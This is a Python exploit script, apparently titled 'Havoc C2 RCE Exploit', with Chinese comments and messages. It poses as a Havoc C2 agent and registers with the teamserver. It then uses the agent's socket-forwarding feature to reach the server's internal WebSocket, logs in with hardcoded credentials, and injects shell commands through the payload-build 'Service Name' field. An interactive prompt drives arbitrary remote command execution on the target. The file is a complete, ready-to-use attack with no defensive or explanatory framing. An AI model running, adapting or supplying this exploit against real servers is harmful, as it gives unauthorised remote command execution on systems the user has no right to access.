import binascii
import random
import requests
import argparse
import urllib3
from Crypto.Cipher import AES
from Crypto.Util import Counter
import hashlib
import json
import os
from colorama import init, Fore, Back, Style
import readline

# 初始化colorama
init(autoreset=True)

# 颜色定义
class Colors:
    SUCCESS = Fore.GREEN
    ERROR = Fore.RED
    INFO = Fore.BLUE
    DEBUG = Fore.YELLOW
    RESET = Style.RESET_ALL

urllib3.disable_warnings()

magic = b"\xde\xad\xbe\xef"
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
agent_id = None
teamserver_listener_url = None
headers = None

# 在文件开头添加debug标志
DEBUG = False

class HavocExploit:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port
        
        self.magic = b"\xde\xad\xbe\xef"
        self.agent_id = self.int_to_bytes(random.randint(100000, 1000000))
        self.AES_Key = b"\x00" * 32
        self.AES_IV = b"\x00" * 16
        self.key_bytes = 32
        
        self.hostname = b"DESKTOP-7F61JT1"
        self.username = b"Administrator"
        self.domain_name = b"ECORP"
        self.internal_ip = b"10.1.33.7"
        self.process_name = "msedge.exe".encode("utf-16le")
        self.process_id = self.int_to_bytes(random.randint(1000, 5000))
        
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
        }
        self.teamserver_url = f"https://{target_host}:{target_port}/havoc"
        self.socket_id = b"\x11\x11\x11\x11"
        self.debug = DEBUG

    def int_to_bytes(self, value, length=4, byteorder="big"):
        return value.to_bytes(length, byteorder)

    def encrypt(self, key, iv, plaintext):
        if len(key) <= self.key_bytes:
            key = key + b"0" * (self.key_bytes - len(key))
        assert len(key) == self.key_bytes
        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)
        return aes.encrypt(plaintext)

    def decrypt(self, key, iv, ciphertext):
        if len(key) <= self.key_bytes:
            key = key + b"0" * (self.key_bytes - len(key))
        assert len(key) == self.key_bytes
        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)
        return aes.decrypt(ciphertext)

    def debug_print(self, *args, **kwargs):
        if self.debug:
            print(f"{Colors.DEBUG}[DEBUG]{Colors.RESET}", *args, **kwargs)

    def debug_http_response(self, response):
        if not self.debug:
            return
        
        print("\n" + "=" * 50)
        print(f"{Colors.DEBUG}[DEBUG] HTTP Response:{Colors.RESET}")
        print("-" * 50)
        # 状态行
        status_color = Colors.SUCCESS if response.status_code == 200 else Colors.ERROR
        print(f"{status_color}HTTP/1.1 {response.status_code} {response.reason}{Colors.RESET}")
        # 响应头
        for header, value in response.headers.items():
            print(f"{Colors.INFO}{header}{Colors.RESET}: {value}")
        print()
        # 响应体
        try:
            if response.content:
                print(f"{Colors.DEBUG}Response Body (Text):{Colors.RESET}")
                print(response.text)
                print(f"\n{Colors.DEBUG}Response Body (Hex):{Colors.RESET}")
                print(response.content.hex())
                print(f"\n{Colors.DEBUG}Response Body (Raw):{Colors.RESET}")
                print(response.content)
        except:
            print(f"{Colors.DEBUG}Response Body (Hex):{Colors.RESET}")
            print(response.content.hex())
        print("=" * 50)

    def debug_http_request(self, method, url, headers, data):
        if not self.debug:
            return
        
        print("\n" + "=" * 50)
        print(f"{Colors.DEBUG}[DEBUG] HTTP Request:{Colors.RESET}")
        print("-" * 50)
        # 请求行
        print(f"{Colors.INFO}{method} {url} HTTP/1.1{Colors.RESET}")
        # 请求头
        for header, value in headers.items():
            print(f"{Colors.INFO}{header}{Colors.RESET}: {value}")
        print()
        # 请求体
        if data:
            print(f"{Colors.DEBUG}Request Body (Hex):{Colors.RESET}")
            print(data.hex())
            try:
                print(f"\n{Colors.DEBUG}Request Body (Text):{Colors.RESET}")
                print(data.decode('utf-8', errors='ignore'))
            except:
                pass
        print("=" * 50)

    def register_agent(self):
        command = b"\x00\x00\x00\x63"
        request_id = b"\x00\x00\x00\x01"

        hostname_length = self.int_to_bytes(len(self.hostname))
        username_length = self.int_to_bytes(len(self.username))
        domain_name_length = self.int_to_bytes(len(self.domain_name))
        internal_ip_length = self.int_to_bytes(len(self.internal_ip))
        process_name_length = self.int_to_bytes(len(self.process_name) - 6)

        data = b"\xab" * 100

        header_data = (command + request_id + self.AES_Key + self.AES_IV + self.agent_id +
                      hostname_length + self.hostname +
                      username_length + self.username +
                      domain_name_length + self.domain_name +
                      internal_ip_length + self.internal_ip +
                      process_name_length + self.process_name +
                      self.process_id + data)

        size = 12 + len(header_data)
        size_bytes = size.to_bytes(4, 'big')
        agent_header = size_bytes + self.magic + self.agent_id

        r = requests.post(self.teamserver_url, data=agent_header + header_data, headers=self.headers, verify=False)
        if r.status_code == 200:
            print(f"{Colors.SUCCESS}[+] Agent注册成功{Colors.RESET}")
            return True
        print(f"{Colors.ERROR}[-] Agent注册失败{Colors.RESET}")
        return False

    def open_socket(self, target_address, target_port):
        command = b"\x00\x00\x09\xec"
        request_id = b"\x00\x00\x00\x02"
        subcommand = b"\x00\x00\x00\x10"
        sub_request_id = b"\x00\x00\x00\x03"
        local_addr = b"\x22\x22\x22\x22"
        local_port = b"\x33\x33\x33\x33"
        socket_id = b"\x11\x11\x11\x11"

        forward_addr = b""
        for octet in target_address.split(".")[::-1]:
            forward_addr += self.int_to_bytes(int(octet), length=1)

        forward_port = self.int_to_bytes(target_port)

        package = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port
        package_size = self.int_to_bytes(len(package) + 4)

        header_data = command + request_id + self.encrypt(self.AES_Key, self.AES_IV, package_size + package)

        size = 12 + len(header_data)
        size_bytes = size.to_bytes(4, 'big')
        agent_header = size_bytes + self.magic + self.agent_id
        data = agent_header + header_data

        r = requests.post(self.teamserver_url, data=data, headers=self.headers, verify=False)
        if r.status_code == 200:
            print(f"{Colors.SUCCESS}[+] Socket连接成功{Colors.RESET}")
            return socket_id
        print(f"{Colors.ERROR}[-] Socket连接失败{Colors.RESET}")
        return None

    def write_socket(self, socket_id, data):
        command = b"\x00\x00\x09\xec"
        request_id = b"\x00\x00\x00\x08"
        subcommand = b"\x00\x00\x00\x11"
        sub_request_id = b"\x00\x00\x00\xa1"
        socket_type = b"\x00\x00\x00\x03"
        success = b"\x00\x00\x00\x01"

        data_length = self.int_to_bytes(len(data))
        
        package = subcommand+socket_id+socket_type+success+data_length+data
        package_size = self.int_to_bytes(len(package) + 4)
        
        self.debug_print("数据长度:", len(data))
        self.debug_print("Socket ID:", socket_id.hex())
        self.debug_print("Package大小:", len(package) + 4)
        self.debug_print("Package内容(HEX):", package.hex())
        
        header_data = command + request_id + self.encrypt(self.AES_Key, self.AES_IV, package_size + package)
        
        self.debug_print("加密后数据大小:", len(header_data))

        size = 12 + len(header_data)
        size_bytes = size.to_bytes(4, 'big')
        agent_header = size_bytes + self.magic + self.agent_id
        post_data = agent_header + header_data

        self.debug_print("发送数据:")
        self.debug_print("-" * 50)
        try:
            self.debug_print(data.decode('utf-8', errors='ignore'))
        except:
            self.debug_print(data)
        self.debug_print("-" * 50)

        # 在发送请求前输出请求详情
        self.debug_http_request("POST", self.teamserver_url, self.headers, post_data)
        
        r = requests.post(self.teamserver_url, data=post_data, headers=self.headers, verify=False)
        
        # 输出响应详情
        self.debug_http_request("POST", self.teamserver_url, self.headers, post_data)
        self.debug_http_response(r)
        
        return r.status_code == 200

    def read_socket(self, socket_id):
        command = b"\x00\x00\x00\x01"
        request_id = b"\x00\x00\x00\x09"
        header_data = command + request_id

        size = 12 + len(header_data)
        size_bytes = size.to_bytes(4, 'big')
        agent_header = size_bytes + self.magic + self.agent_id
        data = agent_header + header_data

        self.debug_print("读取Socket数据...")
        # 在发送请求前输出请求详情
        self.debug_http_request("POST", self.teamserver_url, self.headers, data)
        
        r = requests.post(self.teamserver_url, data=data, headers=self.headers, verify=False)
        
        # 输出响应详情
        self.debug_http_response(r)
        
        if r.status_code == 200 and len(r.content) > 12:
            self.debug_print("响应长度:", len(r.content))
            enc_package = r.content[12:]
            decrypted = self.decrypt(self.AES_Key, self.AES_IV, enc_package)[12:]
            self.debug_print("\n解密后数据:")
            try:
                self.debug_print(decrypted.decode('utf-8', errors='ignore'))
            except:
                self.debug_print(decrypted.hex())
            return decrypted
        return b""

    def create_websocket_frame(self, payload):
        payload_bytes = payload.encode("utf-8")
        frame = bytearray()
        frame.append(0x81)
        payload_length = len(payload_bytes)
        if payload_length <= 125:
            frame.append(0x80 | payload_length)
        elif payload_length <= 65535:
            frame.append(0x80 | 126)
            frame.extend(payload_length.to_bytes(2, byteorder="big"))
        else:
            frame.append(0x80 | 127)
            frame.extend(payload_length.to_bytes(8, byteorder="big"))

        masking_key = os.urandom(4)
        frame.extend(masking_key)
        masked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))
        frame.extend(masked_payload)
        return bytes(frame)

    def execute_command(self, cmd):
        print(f"\n{Colors.INFO}[*] 执行命令: {cmd}{Colors.RESET}")
        injection = f""" \\\\\\\" -mbla; {cmd} 2>&1 && false #"""
        
        self.debug_print("注入命令:", injection)
        
        socket_id = self.open_socket("127.0.0.1", 40056)
        if not socket_id:
            return False
        
        # WebSocket握手
        request = (
            f"GET /havoc/ HTTP/1.1\r\n"
            f"Host: {self.target_host}:{self.target_port}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: 5NUvQyzkv9bpu376gKd2Lg==\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
        ).encode()
        
        if not self.write_socket(socket_id, request):
            print(f"{Colors.ERROR}[-] WebSocket握手失败{Colors.RESET}")
            return False
        self.read_socket(socket_id)
        print(f"{Colors.SUCCESS}[+] WebSocket握手成功{Colors.RESET}")
        
        # 认证
        auth_payload = {
            "Body": {"Info": {"Password": hashlib.sha3_256("CobaltStr1keSuckz!".encode()).hexdigest(), "User": "ilya"}, "SubEvent": 3},
            "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": "ilya"}
        }
        
        if not self.write_socket(socket_id, self.create_websocket_frame(json.dumps(auth_payload))):
            print(f"{Colors.ERROR}[-] 认证失败{Colors.RESET}")
            return False
        self.read_socket(socket_id)
        print(f"{Colors.SUCCESS}[+] 认证成功{Colors.RESET}")
        
        # 监听器配置
        listener_payload = {
            "Body": {"Info": {"Headers": "", "HostBind": "0.0.0.0", "HostHeader": "", "HostRotation": "round-robin", "Hosts": "0.0.0.0", "Name": "abc", "PortBind": "443", "PortConn": "443", "Protocol": "Https", "Proxy Enabled": "false", "Secure": "true", "Status": "online", "Uris": "", "UserAgent": self.headers["User-Agent"]}, "SubEvent": 1},
            "Head": {"Event": 2, "OneTime": "", "Time": "08:39:18", "User": "ilya"}
        }
        
        if not self.write_socket(socket_id, self.create_websocket_frame(json.dumps(listener_payload))):
            print(f"{Colors.ERROR}[-] 监听器配置失败{Colors.RESET}")
            return False
        self.read_socket(socket_id)
        print(f"{Colors.SUCCESS}[+] 监听器配置成功{Colors.RESET}")
        
        # 命令执行
        payload = {
            "Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n \"Amsi/Etw Patch\": \"None\",\n \"Indirect Syscall\": false,\n \"Injection\": {\n \"Alloc\": \"Native/Syscall\",\n \"Execute\": \"Native/Syscall\",\n \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n },\n \"Jitter\": \"0\",\n \"Proxy Loading\": \"None (LdrLoadDll)\",\n \"Service Name\":\"" + injection + "\",\n \"Sleep\": \"2\",\n \"Sleep Jmp Gadget\": \"None\",\n \"Sleep Technique\": \"WaitForSingleObjectEx\",\n \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2},
            "Head": {"Event": 5, "OneTime": "true", "Time": "18:39:04", "User": "ilya"}
        }
        
        if not self.write_socket(socket_id, self.create_websocket_frame(json.dumps(payload))):
            print(f"{Colors.ERROR}[-] 命令执行失败{Colors.RESET}")
            return False
        self.read_socket(socket_id)
        print(f"{Colors.SUCCESS}[+] 命令执行成功{Colors.RESET}")
        
        return True

def main():
    global agent_id, teamserver_listener_url, headers, DEBUG
    
    parser = argparse.ArgumentParser(description='Havoc C2 RCE Exploit')
    parser.add_argument('-t', '--target', required=True, help='目标主机IP')
    parser.add_argument('-p', '--port', type=int, default=443, help='目标端口(默认: 443)')
    parser.add_argument('-debug', action='store_true', help='启用调试模式')
    args = parser.parse_args()

    # 设置全局debug标志
    DEBUG = args.debug
    
    # 设置命令行提示符样式
    prompt = f"{Colors.INFO}shell>{Colors.RESET} "
    
    # 添加命令历史文件支持
    histfile = os.path.join(os.path.expanduser("~"), ".havoc_history")
    try:
        readline.read_history_file(histfile)
    except FileNotFoundError:
        pass
    
    print(f"\n{Colors.INFO}[*] Havoc C2 RCE Exploit{Colors.RESET}")
    print(f"{Colors.INFO}[*] 目标: {args.target}:{args.port}{Colors.RESET}")
    if DEBUG:
        print(f"{Colors.DEBUG}[*] 调试模式已启用{Colors.RESET}")
    print(f"{Colors.INFO}[*] 输入 'exit' 或 'quit' 退出{Colors.RESET}\n")

    while True:
        try:
            cmd = input(prompt)
            readline.write_history_file(histfile)
            
            if cmd.lower() in ['exit', 'quit']:
                print(f"\n{Colors.INFO}[*] 正在退出...{Colors.RESET}")
                break
            
            if not cmd.strip():
                continue
                
            # 每次执行命令前重新创建exploit实例并注册agent
            exploit = HavocExploit(args.target, args.port)
            agent_id = exploit.agent_id
            teamserver_listener_url = args.target
            headers = exploit.headers
            
            if DEBUG:
                print(f"\n{Colors.DEBUG}[DEBUG] 新会话信息:{Colors.RESET}")
                print(f"{Colors.DEBUG}[DEBUG] Agent ID: {agent_id.hex()}{Colors.RESET}")
                print(f"{Colors.DEBUG}[DEBUG] Target URL: {teamserver_listener_url}{Colors.RESET}")
                print(f"{Colors.DEBUG}[DEBUG] Headers: {headers}{Colors.RESET}")
            
            # 注册agent
            if not exploit.register_agent():
                print(f"{Colors.ERROR}[-] Agent注册失败，重试中...{Colors.RESET}")
                continue
                
            # 执行命令
            exploit.execute_command(cmd)
            
        except KeyboardInterrupt:
            print(f"\n{Colors.INFO}[*] 正在退出...{Colors.RESET}")
            break
        except Exception as e:
            print(f"{Colors.ERROR}[-] 错误: {str(e)}{Colors.RESET}")
            if DEBUG:
                import traceback
                print(f"{Colors.ERROR}[DEBUG] 详细错误信息:{Colors.RESET}")
                traceback.print_exc()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.INFO}[*] 程序已终止{Colors.RESET}")
